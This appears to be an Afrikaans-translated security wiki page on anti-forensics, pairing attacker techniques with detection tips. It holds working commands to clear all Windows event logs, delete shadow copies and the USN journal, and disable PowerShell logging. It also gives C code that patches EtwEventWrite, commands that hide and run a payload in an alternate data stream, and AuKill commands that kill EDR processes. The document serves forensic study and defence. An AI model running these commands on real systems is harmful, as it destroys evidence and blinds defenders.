# Anti-Forensiese Tegnieke

## Tydstempels

'n Aanvaller kan daarin belangstel om **die tydstempels van lêers te verander** om te voorkom dat hy opgespoor word.\
Dit is moontlik om die tydstempels binne die MFT in die attribute `$STANDARD_INFORMATION` \_\_ en \_\_ `$FILE_NAME` te vind.

Albei attribute het 4 tydstempels: **Wysiging**, **toegang**, **skepping**, en **MFT-registerwysiging** (MACE of MACB).

**Windows Explorer** en ander tools wys die information vanaf **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensiese Tool

Hierdie tool **wysig** die tydstempelinligting binne **`$STANDARD_INFORMATION`** **maar** **nie** die information binne **`$FILE_NAME`** nie. Daarom is dit moontlik om **verdagte** **aktiwiteit** te **identifiseer**.

### Usnjrnl

Die **USN Journal** (Update Sequence Number Journal) is 'n funksie van NTFS (Windows NT file system) wat veranderinge aan volumes byhou. Die [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)-tool laat die ondersoek van hierdie veranderinge toe.

![TimeStomp - Anti-forensiese Tool - Usnjrnl: Die USN Journal (Update Sequence Number Journal) is 'n funksie van NTFS (Windows NT file system) wat veranderinge aan volumes byhou. Die...](<../../images/image (801).png>)

Die vorige image is die **output** wat deur die **tool** gewys word, waar waargeneem kan word dat sommige **veranderinge aan die lêer aangebring is**.

### $LogFile

**Alle metadata-veranderinge aan 'n file system word aangeteken** in 'n proses wat as [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) bekend staan. Die aangetekende metadata word gehou in 'n lêer genaamd `**$LogFile**`, wat in die wortelgids van 'n NTFS file system geleë is. Tools soos [LogFileParser](https://github.com/jschicht/LogFileParser) kan gebruik word om hierdie lêer te parse en veranderinge te identifiseer.

![Usnjrnl - $LogFile: Alle metadata-veranderinge aan 'n file system word aangeteken in 'n proses wat as write-ahead logging bekend staan. Die aangetekende metadata word gehou in 'n lêer genaamd $LogFile , wat in die wortel...](<../../images/image (137).png>)

Weereens is dit in die output van die tool moontlik om te sien dat **sommige veranderinge aangebring is**.

Deur dieselfde tool te gebruik, is dit moontlik om te identifiseer **na watter tyd die tydstempels gewysig is**:

![Usnjrnl - $LogFile: Deur dieselfde tool te gebruik, is dit moontlik om te identifiseer na watter tyd die tydstempels gewysig is](<../../images/image (1089).png>)

- CTIME: Skeppingstyd van die lêer
- ATIME: Wysigingstyd van die lêer
- MTIME: MFT-registerwysiging van die lêer
- RTIME: Toegangstyd van die lêer

### Vergelyking van `$STANDARD_INFORMATION` en `$FILE_NAME`

'n Ander manier om verdagte gewysigde lêers te identifiseer, is om die tyd op albei attribute te vergelyk en na **teenstrydighede** te soek.

### Nanosekondes

**NTFS**-tydstempels het 'n **presisie** van **100 nanosekondes**. Daarom is dit baie verdag om lêers met tydstempels soos 2010-10-10 10:10:**00.000:0000 te vind**.

### SetMace - Anti-forensiese Tool

Hierdie tool kan albei attribute `$STARNDAR_INFORMATION` en `$FILE_NAME` wysig. Vanaf Windows Vista is dit egter nodig dat 'n aktiewe OS hierdie information wysig.

## Data Hiding

NFTS gebruik 'n cluster en die minimum informationgrootte. Dit beteken dat indien 'n lêer een en 'n half cluster gebruik, die **oorblywende helfte nooit gebruik sal word nie** totdat die lêer deleted is. Daarom is dit moontlik om **data in hierdie slack space te versteek**.

Daar is tools soos slacker wat dit moontlik maak om data in hierdie "hidden" space te versteek. 'n Ontleding van die `$logfile` en `$usnjrnl` kan egter wys dat sommige data bygevoeg is:

![SetMace - Anti-forensiese Tool - Data Hiding: Daar is tools soos slacker wat dit moontlik maak om data in hierdie "hidden" space te versteek. 'n Ontleding van die $logfile en $usnjrnl kan egter wys dat...](<../../images/image (1060).png>)

Daarna is dit moontlik om die slack space met tools soos FTK Imager te retrieve. Let daarop dat hierdie soort tool die inhoud obfuscated of selfs encrypted kan stoor.

## UsbKill

Dit is 'n tool wat die **computer sal afskakel indien enige verandering in die USB**-poorte bespeur word.\
Een manier om dit te ontdek, is om die lopende prosesse te inspekteer en **elke lopende Python-script te hersien**.

## Live Linux Distributions

Hierdie distros word **binne die RAM**-geheue **uitgevoer**. Die enigste manier om hulle op te spoor, is **indien die NTFS file-system met skryftoestemmings gemount is**. Indien dit slegs met leestoestemmings gemount is, sal dit nie moontlik wees om die intrusion op te spoor nie.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Dit is moontlik om verskeie Windows-loggingmetodes te disable om die forensiese ondersoek baie moeiliker te maak.

### Disable Timestamps - UserAssist

Dit is 'n registry key wat die datums en tye byhou waarop elke executable deur die gebruiker uitgevoer is.

Om UserAssist te disable, vereis twee stappe:

1. Stel twee registry keys, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` en `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, albei op nul om aan te dui dat ons UserAssist disabled wil hê.
2. Clear jou registry-subtrees wat lyk soos `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

Dit sal information oor die applications wat uitgevoer is stoor met die doel om die performance van die Windows-stelsel te verbeter. Dit kan egter ook nuttig wees vir forensiese praktyke.

- Voer `regedit` uit
- Kies die filepath `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Regsklik op beide `EnablePrefetcher` en `EnableSuperfetch`
- Kies Modify op elk hiervan om die waarde van 1 (of 3) na 0 te verander
- Restart

### Disable Timestamps - Last Access Time

Wanneer 'n folder vanaf 'n NTFS-volume op 'n Windows NT-server oopgemaak word, neem die stelsel die tyd om **'n tydstempelveld op elke gelysde folder op te dateer**, genaamd die last access time. Op 'n intensief gebruikte NTFS-volume kan dit performance beïnvloed.

1. Open die Registry Editor (Regedit.exe).
2. Navigeer na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Soek `NtfsDisableLastAccessUpdate`. Indien dit nie bestaan nie, voeg hierdie DWORD by en stel die waarde daarvan op 1, wat die proses sal disable.
4. Sluit die Registry Editor en reboot die server.

### Delete USB History

Al die **USB Device Entries** word in die Windows Registry onder die **USBSTOR** registry key gestoor, wat subkeys bevat wat geskep word wanneer jy 'n USB Device by jou PC of Laptop inprop. Jy kan hierdie key hier vind: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Deur dit te delete**, sal jy die USB history delete.\
Jy kan ook die tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) gebruik om seker te maak dat jy hulle deleted het (en om hulle te delete).

'n Ander lêer wat information oor die USBs stoor, is die lêer `setupapi.dev.log` binne `C:\Windows\INF`. Dit moet ook deleted word.

### Disable Shadow Copies

**Lys** shadow copies met `vssadmin list shadowstorage`\
**Delete** hulle deur `vssadmin delete shadow` uit te voer

Jy kan hulle ook via die GUI delete deur die stappe te volg wat voorgestel word in [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Om shadow copies te disable [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Open die Services-program deur "services" in die tekssoekkassie te tik nadat jy die Windows-startknoppie geklik het.
2. Vind "Volume Shadow Copy" in die lys, kies dit en open dan Properties deur regs te klik.
3. Kies Disabled uit die "Startup type"-aftrekkieslys en bevestig dan die verandering deur Apply en OK te klik.

Dit is ook moontlik om die configuration van watter lêers in die shadow copy gekopieer gaan word, in die registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` te wysig.

### Overwrite deleted files

- Jy kan 'n **Windows tool** gebruik: `cipher /w:C` Dit sal cipher aandui om enige data uit die beskikbare ongebruikte skyfspasie binne die C-drive te remove.
- Jy kan ook tools soos [**Eraser**](https://eraser.heidi.ie) gebruik.

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Brei "Windows Logs" uit --> Regsklik op elke kategorie en kies "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Disable die diens "Windows Event Log" binne die services-afdeling
- `WEvtUtil.exec clear-log` of `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Onlangse weergawes van Windows 10/11 en Windows Server hou **uitgebreide PowerShell-forensiese artifacts** onder
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
Aanvallers kan dit on-the-fly disable of wipe:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Verdedigers moet monitor vir veranderinge aan daardie registersleutels en grootskaalse verwydering van PowerShell-gebeure.

### ETW (Event Tracing for Windows) Patch

Endpoint-sekuriteitsprodukte maak sterk op ETW staat. ’n Gewilde ontwykingsmetode in 2024 is om
`ntdll!EtwEventWrite`/`EtwEventWriteFull` in die geheue te patch sodat elke ETW-oproep
`STATUS_SUCCESS` terugstuur sonder om die gebeurtenis uit te stuur:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Publieke PoCs (bv. `EtwTiSwallow`) implementeer dieselfde primitive in PowerShell of C++.
Omdat die patch **process-local** is, kan EDRs wat binne ander prosesse loop dit mis.<sup>[[5]](#references)</sup>
Opsporing: vergelyk `ntdll` in die geheue met die een op skyf, of hook voordat user-mode begin.

### Alternate Data Streams (ADS) Herlewing

Malware-veldtogte in 2023 (bv. **FIN12** loaders) is al gesien waar hulle second-stage binaries
binne ADS plaas om buite die sig van tradisionele skandeerders te bly:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumereer streams met `dir /R`, `Get-Item -Stream *`, of Sysinternals `streams64.exe`.
Deur die host-lêer na FAT/exFAT of via SMB te kopieer, sal die versteekte stream verwyder word en kan
ondersoekers dit gebruik om die payload te herwin.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver word nou gereeld vir **anti-forensics** in ransomware-
indringings gebruik.
Die open-source-hulpmiddel **AuKill** laai ’n ondertekende maar kwesbare driver (`procexp152.sys`) om
EDR- en forensiese sensors **voor enkripsie & logvernietiging** te suspendeer of te beëindig:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Die driver word daarna verwyder, wat minimale artefakte agterlaat.<sup>[[1]](#references)</sup>
Versagtings: aktiveer die Microsoft vulnerable-driver blocklist (HVCI/SAC),
en genereer waarskuwings wanneer kernel-services vanaf user-writable paths geskep word.

---

## Linux Anti-Forensics: Self-Patching and Cloud C2 (2023–2025)

### Self-patching van gekompromitteerde services om detection te verminder (Linux)
Aanvallers “self-patch” toenemend ’n service onmiddellik nadat hulle dit uitgebuit het, om beide heruitbuiting te voorkom en vulnerability-based detections te onderdruk. Die idee is om kwesbare komponente met die nuutste legitieme upstream binaries/JARs te vervang, sodat scanners die host as patched rapporteer terwyl persistence en C2 behoue bly.<sup>[[3]](#references)</sup>

Voorbeeld: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Na exploitation het aanvallers legitieme JARs vanaf Maven Central (repo1.maven.org) afgelaai, kwesbare JARs in die ActiveMQ-installation verwyder en die broker herbegin.
- Dit het die aanvanklike RCE gesluit terwyl ander footholds (cron, SSH config changes, aparte C2 implants) behoue gebly het.

Operational example (illustrative)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensiese/hunting-wenke
- Hersien diensgidse vir ongeskeduleerde vervangings van binaries/JARs:
- Debian/Ubuntu: `dpkg -V activemq` en vergelyk lêer-hashes/-paaie met repo mirrors.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Soek na JAR-weergawes wat op skyf teenwoordig is, maar nie deur die package manager besit word nie, of simboliese skakels wat out-of-band opgedateer is.
- Tydlyn: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` om ctime/mtime met die kompromitteringsvenster te korreleer.
- Shell history/process telemetry: bewyse van `curl`/`wget` na `repo1.maven.org` of ander artifact-CDNs onmiddellik ná aanvanklike exploitation.
- Change management: valideer wie die “patch” toegepas het en waarom, nie slegs dat ’n gepatchte weergawe teenwoordig is nie.

### Cloud-service C2 met bearer tokens en anti-analysis stagers
Waargenome tradecraft het verskeie langafstand-C2-paaie en anti-analysis-packaging gekombineer:<sup>[[3]](#references)</sup>
- Wagwoordbeskermde PyInstaller ELF-loaders om sandboxing en static analysis te belemmer (bv. encrypted PYZ, tydelike extraction onder `/_MEI*`).
- Indicators: `strings`-treffers soos `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: extraction na `/tmp/_MEI*` of custom `--runtime-tmpdir`-paaie.
- Dropbox-backed C2 met hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` met `Authorization: Bearer <token>`.
- Hunt in proxy/NetFlow/Zeek/Suricata vir uitgaande HTTPS na Dropbox-domains vanaf server-workloads wat normaalweg nie files sync nie.
- Parallelle/backup C2 via tunneling (bv. Cloudflare Tunnel `cloudflared`), wat beheer behou indien een channel geblokkeer word.
- Host IOCs: `cloudflared`-prosesse/-units, config by `~/.cloudflared/*.json`, uitgaande 443 na Cloudflare edges.

### Persistence en “hardening rollback” om toegang te behou (Linux-voorbeelde)
Attackers kombineer self-patching dikwels met volhoubare access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron: wysigings aan die `0anacron`-stub in elke `/etc/cron.*/`-directory vir periodieke execution.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: enabling van root logins en wysiging van default shells vir low-privileged accounts.
- Hunt vir root-login-enablement:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt vir suspicious interactive shells op system accounts (bv. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Random, kortbenoemde beacon-artifacts (8 alfabetiese karakters) wat na skyf geskryf word en ook met cloud C2 kommunikeer:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders behoort hierdie artifacts met eksterne exposure en diens-patching events te korreleer om anti-forensic self-remediation te ontdek wat gebruik word om aanvanklike exploitation te verberg.

## References

- [1] [Sophos X-Ops – AuKill: ’n Gewapende Kwesbare Driver vir die Deaktivering van EDR (Maart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching van EtwEventWrite vir Stealth: Detection & Hunting (Junie 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching vir persistence: Hoe DripDropper Linux-malware deur die cloud beweeg](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
